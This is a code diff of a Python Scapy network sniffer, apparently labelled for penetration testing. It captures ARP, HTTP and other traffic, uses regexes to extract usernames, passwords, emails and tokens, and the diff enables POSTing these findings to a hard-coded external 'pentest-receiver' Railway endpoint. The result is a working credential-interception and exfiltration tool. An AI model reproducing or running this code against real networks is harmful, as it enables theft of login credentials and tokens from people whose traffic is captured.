@@ -1,32 +1,20 @@
-import ctypes
 import json
 import os
 import sys
 import time
-from scapy.all import sniff
+from scapy.all import conf, get_if_list, sniff
 from datetime import datetime
 import re
 from urllib.parse import unquote_plus
 from urllib.request import Request, urlopen
 
-MUTEX_NAME = "Global\\NetworkSnifferMutex"
-
-def already_running(): 
-    kernel32 = ctypes.windll.kernel32
-    mutex = kernel32.CreateMutexW(None, False, MUTEX_NAME)
-    last_error = kernel32.GetLastError()
-    if last_error == 183:  # ERROR_ALREADY_EXISTS
-        kernel32.CloseHandle(mutex)
-        return True
-    global mutex_handle
-    mutex_handle = mutex
-    return False
-
-
 LOG_FILE = "sniffer.log"
 DEDUP_WINDOW_SECONDS = 0.35
 _RECENT_LOGS = {}
-# JSON_ENDPOINT = "https://pentest-receiver-production.up.railway.app/packets/data" #this probably does not work
+JSON_ENDPOINT = os.getenv(
+    "SNIFFER_JSON_ENDPOINT",
+    "https://pentest-receiver-production.up.railway.app/packets/data",
+)
 
 FORM_FIELD_RE = re.compile(r"(?:^|[?&;\s])(?P<key>username|email|password|pass|pwd|token|login)=(?P<value>[^&\s]+)", re.IGNORECASE)
 JSON_FIELD_RE = re.compile(r'"(?P<key>username|email|password|pass|pwd|token|login)"\s*:\s*"(?P<value>[^"]+)"', re.IGNORECASE)
@@ -64,12 +52,13 @@ def parse_finding_data(finding):
 
 
 def build_event_json(timestamp, protocol, finding):
+    # Railway espera que 'data' sea un String, no un objeto/diccionario.
+    # Por eso enviamos el 'finding' original que ya es una cadena de texto.
     return {
         "date": timestamp,
         "protocol": protocol,
-        "data": parse_finding_data(finding),
+        "data": str(finding), # Aseguramos que sea String
     }
-
 
 def send_event_json(event):
     if not JSON_ENDPOINT:
@@ -83,11 +72,11 @@ def send_event_json(event):
             headers={"Content-Type": "application/json"},
             method="POST",
         )
-        with urlopen(request, timeout=2):
+        with urlopen(request, timeout=10):
             pass
-    except Exception:
-        return
 
+    except Exception as e:
+        print(f"[!] Error enviando JSON a {JSON_ENDPOINT}: {e}")
 
 def _is_duplicate_event(protocol, finding):
     now = time.time()
@@ -327,7 +316,8 @@ def process_http(packet, timestamp):
 
 def packet_callback(packet):
 
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    timestamp = datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
+    
     if packet.haslayer("ARP"):
         process_arp(packet, timestamp)
         return
@@ -370,19 +360,25 @@ def packet_callback(packet):
         process_http(packet, timestamp)
 
 def main():
-    iface = None # None on Windows to use default interface, "lo" for Linux loopback testing
+    iface = None
+
+    # Localhost traffic tests on Windows require the Npcap loopback interface.
+    if sys.platform.startswith("win"):
+        available_ifaces = set(get_if_list())
+        loopback_candidates = [
+            conf.loopback_name,
+            r"\Device\NPF_Loopback",
+            "NPF_Loopback",
+        ]
+        for candidate in loopback_candidates:
+            if candidate and candidate in available_ifaces:
+                iface = candidate
+                break
+
     bpf_filter = "tcp or udp or icmp or arp"
     print(f"[*] Scapy sniffer started on iface={iface or 'default'} filter='{bpf_filter}'. Press Ctrl+C to stop.")
     sniff(iface=iface, filter=bpf_filter, prn=packet_callback, store=False)
 
 if __name__ == "__main__": 
     # uncomment the following lines on Windows
-    if already_running():
-        print("Another instance of the sniffer is already running. Exiting.")
-        sys.exit(0)
-    try:
         main()
-    finally:
-        if 'mutex_handle' in globals():
-            ctypes.windll.kernel32.CloseHandle(mutex_handle)
-        pass
